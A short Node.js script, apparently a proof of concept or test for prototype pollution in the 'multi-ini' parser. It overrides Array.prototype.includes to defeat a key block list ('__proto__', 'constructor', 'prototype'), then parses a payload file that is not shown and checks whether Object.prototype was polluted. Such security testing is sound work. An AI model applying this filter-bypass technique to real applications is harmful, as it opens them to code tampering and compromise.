Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
const ini = require('multi-ini');
const path = require('path');
console.log({}.polluted);
ini.read(path.resolve(__dirname, './payload.toml'), { encoding: 'utf8' });
console.log({}.polluted);